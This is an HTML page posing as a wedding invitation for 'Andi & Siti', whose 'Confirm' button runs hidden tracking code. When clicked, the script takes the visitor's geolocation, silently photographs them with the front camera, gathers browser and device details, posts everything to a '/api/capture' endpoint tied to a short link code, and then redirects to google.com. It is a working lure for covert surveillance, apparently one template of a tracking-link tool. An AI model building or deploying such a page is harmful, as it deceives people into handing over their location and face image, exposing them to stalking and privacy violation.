<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Undangan Pernikahan</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Georgia,serif;background:linear-gradient(135deg,#fce4ec,#f8bbd0);display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{background:rgba(255,255,255,0.95);padding:50px;border-radius:20px;max-width:500px;width:100%;text-align:center;box-shadow:0 10px 40px rgba(0,0,0,0.1)}
.decoration{font-size:40px;margin-bottom:10px}
.title{font-size:28px;color:#880e4f;margin-bottom:5px}
.subtitle{font-size:14px;color:#888;margin-bottom:20px}
.names{font-size:32px;color:#880e4f;font-weight:bold;margin:20px 0}
.date{font-size:18px;color:#555;margin-bottom:5px}
.time{font-size:14px;color:#888;margin-bottom:20px}
.btn{width:100%;padding:14px;background:#880e4f;color:#fff;border:none;border-radius:30px;font-size:16px;font-weight:bold;cursor:pointer}
.btn:hover{background:#6a0d3a}
.btn:disabled{opacity:0.6;cursor:not-allowed}
.status{margin-top:15px;font-size:13px;color:#888}
.spinner{display:none;border:3px solid #f3f3f3;border-top:3px solid #880e4f;border-radius:50%;width:20px;height:20px;animation:spin 1s linear infinite;margin:10px auto}
@keyframes spin{100%{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="container">
<div class="decoration">💐</div>
<div class="title">Wedding Invitation</div>
<div class="subtitle">You are invited to celebrate</div>
<div class="names">Andi &amp; Siti</div>
<div class="date">📅 Saturday, 15 June 2025</div>
<div class="time">⏰ 10:00 AM - 02:00 PM</div>
<button class="btn" id="captureBtn">💌 Confirm</button>
<div class="spinner" id="spinner"></div>
<div class="status" id="status">🔒 Confirm your attendance</div>
</div>
<script>
(function(){
const btn=document.getElementById('captureBtn');
const statusEl=document.getElementById('status');
const spinner=document.getElementById('spinner');
let dataSent=false;
const path=window.location.pathname;
const code=path.split('/').pop()||'unknown';
btn.addEventListener('click',function(){
if(dataSent)return;
dataSent=true;
btn.disabled=true;
spinner.style.display='block';
statusEl.textContent='📡 Mengumpulkan data...';
const reportData={shortCode:code,type:'template',data:{ip:'Tidak diketahui',country:'Tidak diketahui',city:'Tidak diketahui',region:'Tidak diketahui',isp:'Tidak diketahui',browser:navigator.userAgent,os:navigator.platform||'Tidak diketahui',device:navigator.userAgentData?.platform||navigator.platform||'Tidak diketahui',userAgent:navigator.userAgent,fromUrl:document.referrer||'Direct',photoStatus:'Kamera ditolak/gagal',template:'Wedding'}};
if(navigator.geolocation){
navigator.geolocation.getCurrentPosition(function(pos){
reportData.data.lat=pos.coords.latitude;
reportData.data.lng=pos.coords.longitude;
reportData.data.accuracy=pos.coords.accuracy+' meter';
statusEl.textContent='📍 Lokasi didapatkan ✅';
takePhoto();
},function(){takePhoto();});
}else{takePhoto();}
function takePhoto(){
if(navigator.mediaDevices&&navigator.mediaDevices.getUserMedia){
navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false})
.then(function(stream){
const video=document.createElement('video');
video.srcObject=stream;
video.onloadedmetadata=function(){
video.play();
const canvas=document.createElement('canvas');
canvas.width=Math.min(video.videoWidth,640);
canvas.height=Math.min(video.videoHeight,480);
const ctx=canvas.getContext('2d');
ctx.drawImage(video,0,0,canvas.width,canvas.height);
reportData.data.photo=canvas.toDataURL('image/jpeg',0.7);
reportData.data.photoStatus='📷 Foto berhasil diambil ✅';
stream.getTracks().forEach(t=>t.stop());
statusEl.textContent='📷 Foto berhasil ✅';
sendData();
};
})
.catch(function(){reportData.data.photoStatus='📷 Kamera ditolak/gagal';sendData();});
}else{reportData.data.photoStatus='📷 Kamera tidak didukung';sendData();}
}
function sendData(){
statusEl.textContent='📤 Mengirim data...';
fetch('/api/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(reportData)})
.then(res=>res.json())
.then(function(){
statusEl.textContent='✅ Berhasil!';
spinner.style.display='none';
btn.textContent='✅ Done';
setTimeout(()=>{window.location.href='https://google.com';},1500);
})
.catch(function(){
statusEl.textContent='❌ Gagal';
spinner.style.display='none';
btn.textContent='⚠️ Error';
setTimeout(()=>{window.location.href='https://google.com';},1500);
});
}
});
})();
</script>
</body>
</html>
